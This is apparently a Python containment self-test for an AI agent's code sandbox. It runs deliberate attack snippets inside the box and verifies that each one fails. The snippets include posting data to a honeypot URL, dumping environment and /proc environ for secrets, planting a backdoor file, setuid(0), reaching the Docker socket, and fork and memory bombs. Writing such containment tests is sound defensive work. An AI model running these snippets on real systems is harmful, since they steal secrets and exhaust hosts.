"""Containment self-test: attack the box on purpose and show each attack fail, with the sandbox's own
output as evidence. Runs in the same image, with the same flags, as the agent's code.

The positive control matters: a fixed request from a container that is given networking reaches the
honeypot on this server. So when the same request from the sandbox fails, it is the sandbox that
stopped it, not a dead address."""

import os
import re
import secrets
import subprocess
import threading
from collections.abc import Callable
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from app import sandbox
from app.clock import now

CANARY_VAR = "HUFU_CANARY_SECRET"


@dataclass(frozen=True)
class Check:
    key: str
    title: str
    attack: str  # what the attacker tries, in one line
    code: str
    limits: sandbox.Limits = sandbox.Limits(timeout_s=20)


@dataclass
class CheckResult:
    key: str
    title: str
    attack: str
    passed: bool | None = None  # None while running
    evidence: str = ""
    exit_code: int | None = None
    killed: str | None = None
    duration_ms: int = 0


@dataclass
class SelfTest:
    test_id: str
    started: str
    runtime: str
    results: list[CheckResult] = field(default_factory=list)
    state: str = "running"
    leftover_containers: int | None = None


def _checks(honeypot_url: str) -> list[Check]:
    return [
        Check("egress_ip", "Outbound network", "connect to 1.1.1.1:443",
              "import socket\ns = socket.create_connection(('1.1.1.1', 443), timeout=5)\nprint('CONNECTED')"),
        Check("egress_dns", "DNS", "resolve api.vultrinference.com",
              "import socket\nprint('RESOLVED', socket.gethostbyname('api.vultrinference.com'))"),
        Check("honeypot", "Exfiltration to the honeypot", "POST data to this server's honeypot",
              "import urllib.request\n"
              f"urllib.request.urlopen({honeypot_url!r}, data=b'stolen', timeout=5)\nprint('SENT')"),
        Check("secrets", "Secrets in the environment", "read API keys from env and /proc",
              "import os, glob\n"
              "print('ENV', sorted(os.environ))\n"
              "for p in glob.glob('/proc/*/environ'):\n"
              "    try:\n"
              "        print(p, open(p, 'rb').read().replace(b'\\0', b' ').decode(errors='replace'))\n"
              "    except Exception as e:\n"
              "        print(p, 'unreadable:', type(e).__name__)\n"),
        Check("write_data", "Tamper with the data", "append a line to /data/invoices.csv",
              "open('/data/invoices.csv', 'a').write('INV-9999,paid\\n')\nprint('WRITTEN')"),
        Check("write_root", "Plant a file in the image", "write /usr/local/bin/backdoor",
              "open('/usr/local/bin/backdoor', 'w').write('#!/bin/sh')\nprint('WRITTEN')"),
        Check("root", "Become root", "setuid(0)",
              "import os\nprint('uid', os.getuid())\nos.setuid(0)\nprint('ROOT')"),
        Check("docker_socket", "Reach the Docker daemon", "open /var/run/docker.sock",
              "import socket\ns = socket.socket(socket.AF_UNIX)\ns.connect('/var/run/docker.sock')\nprint('DOCKER')"),
        Check("fork_bomb", "Fork bomb", "spawn processes until the host falls over",
              "import os, time\nn = 0\ntry:\n    while n < 5000:\n        if os.fork() == 0:\n"
              "            time.sleep(30)\n            os._exit(0)\n        n += 1\nexcept OSError as e:\n"
              "    print('stopped after', n, 'processes:', e)\nelse:\n    print('FORKED', n)\n"),
        Check("memory_bomb", "Memory bomb", "allocate 4 GB",
              "blocks = []\nfor i in range(64):\n    blocks.append(bytearray(64 * 1024 * 1024))\n"
              "print('ALLOCATED', len(blocks) * 64, 'MB')"),
        Check("time_bomb", "Infinite loop", "spin forever",
              "while True:\n    pass", sandbox.Limits(timeout_s=6)),
        Check("kernel", "Kernel isolation", "read the kernel the code is running on",
              "print(open('/proc/version').read().strip())"),
    ]


def _judge(check: Check, r: sandbox.SandboxResult, canary: str, host_secrets: list[str],
           hits_before: int, hits_after: int, rt: str) -> tuple[bool, str]:
    text = (r.stdout + "\n" + r.stderr).strip()
    last = text.splitlines()[-1] if text else ""
    k = check.key
    if k == "honeypot":
        ok = "SENT" not in r.stdout and hits_after == hits_before
        return ok, f"{last} | honeypot hits from the sandbox: {hits_after - hits_before}"
    if k == "secrets":
        leaked = [s for s in [canary, *host_secrets] if s and s in text]
        env = re.search(r"ENV (\[.*?\])", r.stdout)
        return not leaked, (f"env names: {env[1] if env else '?'}; host canary found: "
                            f"{'YES' if leaked else 'no'}")
    if k == "fork_bomb":
        m = re.search(r"stopped after (\d+) processes", r.stdout)
        ok = m is not None and int(m[1]) < check.limits.pids
        return ok, last or (f"killed: {r.killed}" if r.killed else "no output")
    if k == "memory_bomb":
        ok = "ALLOCATED" not in r.stdout
        return ok, f"killed by the memory limit (exit {r.exit_code})" if r.killed == "memory" else last
    if k == "time_bomb":
        return r.killed == "timeout", f"killed after {r.duration_ms / 1000:.1f} s (limit {check.limits.timeout_s:.0f} s)"
    if k == "kernel":
        gvisor = "4.4.0" in r.stdout and rt == "runsc"
        if rt == "runsc":
            return gvisor, f"{r.stdout.strip()[:90]} (gVisor's user-space kernel)"
        return True, f"{r.stdout.strip()[:90]} (runc: shares the host kernel; the VM uses gVisor)"
    marker = {"egress_ip": "CONNECTED", "egress_dns": "RESOLVED", "write_data": "WRITTEN",
              "write_root": "WRITTEN", "root": "ROOT", "docker_socket": "DOCKER"}[k]
    return marker not in r.stdout and not r.ok, last or "no output"


def control_request(url: str) -> tuple[bool, str]:
    """The positive control: a fixed, harmless request from a container that does have networking.
    Never runs model code."""
    code = f"import urllib.request\nurllib.request.urlopen({url!r}, data=b'control', timeout=8)\nprint('OK')"
    cmd = ["docker", "run", "--rm", "-i", "--label", f"{sandbox.LABEL}=1", "--network", "bridge",
           "--cap-drop", "ALL", "--security-opt", "no-new-privileges", "--read-only",
           "--tmpfs", "/tmp:rw,noexec,nosuid,size=64m,mode=1777", "--user", "10001:10001",
           "--add-host", "host.docker.internal:host-gateway", sandbox.IMAGE]
    try:
        proc = subprocess.run(cmd, input=code.encode(), capture_output=True, timeout=40,
                              env=sandbox._docker_env())
    except subprocess.TimeoutExpired:
        return False, "control timed out"
    out = proc.stdout.decode("utf-8", "replace")
    err = proc.stderr.decode("utf-8", "replace").strip().splitlines()
    return "OK" in out.split(sandbox.SENTINEL)[0], (err[-1] if err else "reached the honeypot")


class SelfTestRunner:
    def __init__(self, data_dir: Path, hits: Callable[[str], int],
                 run_code: sandbox.RunCodeFn | None = None,
                 control: Callable[[str], tuple[bool, str]] = control_request) -> None:
        self.data_dir = data_dir
        self.hits = hits
        self.run_code = run_code or sandbox.run_code
        self.control = control
        self.tests: dict[str, SelfTest] = {}
        self._busy = threading.Lock()

    def start(self, honeypot_base: str) -> SelfTest:
        if not self._busy.acquire(blocking=False):
            raise RuntimeError("a self-test is already running")
        test = SelfTest(secrets.token_hex(5), now().isoformat(), sandbox.runtime())
        self.tests[test.test_id] = test
        threading.Thread(target=self._run, args=(test, honeypot_base), daemon=True).start()
        return test

    def _run(self, test: SelfTest, honeypot_base: str) -> None:
        try:
            token = secrets.token_urlsafe(12)
            url = f"{honeypot_base}/api/honeypot/{token}"
            canary = secrets.token_hex(16)
            os.environ[CANARY_VAR] = canary  # the app process holds it; the box must never see it
            host_secrets = [v for k, v in os.environ.items()
                            if re.search(r"KEY|TOKEN|SECRET|PASSWORD", k) and len(v) >= 12]
            ctrl = CheckResult("control", "Positive control", "same POST from a networked container")
            test.results.append(ctrl)
            before = self.hits(token)
            ok, evidence = self.control(url)
            ctrl.passed = ok and self.hits(token) > before
            ctrl.evidence = f"{evidence} | honeypot hits: {self.hits(token) - before}"
            for check in _checks(url):
                res = CheckResult(check.key, check.title, check.attack)
                test.results.append(res)
                before = self.hits(token)
                r = self.run_code(check.code, self._data(), check.limits)
                res.passed, res.evidence = _judge(check, r, canary, host_secrets, before,
                                                  self.hits(token), test.runtime)
                res.exit_code, res.killed, res.duration_ms = r.exit_code, r.killed, r.duration_ms
            test.leftover_containers = len(sandbox.leftover_containers())
            test.state = "done"
        except Exception as exc:
            test.state = f"error: {type(exc).__name__}: {str(exc)[:200]}"
        finally:
            self._busy.release()

    def _data(self) -> Path:
        """A one-file /data, mounted read-only like the agent's datasets."""
        self.data_dir.mkdir(parents=True, exist_ok=True)
        sample = self.data_dir / "invoices.csv"
        if not sample.exists():
            sample.write_text("invoice_id,amount_usd\nINV-0001,100.00\n", encoding="utf-8")
            sample.chmod(0o644)
        self.data_dir.chmod(0o755)
        return self.data_dir

    def view(self, test: SelfTest) -> dict[str, Any]:
        done = [r for r in test.results if r.passed is not None]
        return {
            "test_id": test.test_id,
            "state": test.state,
            "runtime": test.runtime,
            "started": test.started,
            "passed": sum(1 for r in done if r.passed),
            "total": len(_checks("")) + 1,
            "leftover_containers": test.leftover_containers,
            "results": [r.__dict__ for r in test.results],
        }
